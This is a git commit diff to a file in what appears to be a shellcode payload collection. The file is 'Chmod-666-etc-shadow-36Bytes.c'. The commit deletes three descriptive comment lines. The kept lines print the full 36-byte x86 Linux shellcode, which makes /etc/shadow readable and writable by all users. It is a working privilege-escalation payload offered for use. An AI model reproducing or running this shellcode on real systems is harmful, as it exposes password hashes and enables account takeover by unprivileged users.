751a3eb081bda28b1f35abf0b806a07de9f01386
SK <3892621+SafeAF@users.noreply.github.com>
2025-02-19 15:29:07 -0700

    Update Chmod-666-etc-shadow-36Bytes.c

--- Payloads/Linux/Chmod-666-etc-shadow-36Bytes.c
+++ Payloads/Linux/Chmod-666-etc-shadow-36Bytes.c
@@ -1,7 +1,4 @@
 // Linux Shellcode Chmod 666 /etc/shadow - 36 Bytes
-// Exploit payload that sets system password file /etc/shadow to read and write for all users 
-// BareMetal Networks Corporation (C) 2009 SJK
-// Weaponized Machine Code: 
 // \x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\x68\xb6\x01\x59\xb0\x0f\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80
 
 #include <stdio.h>
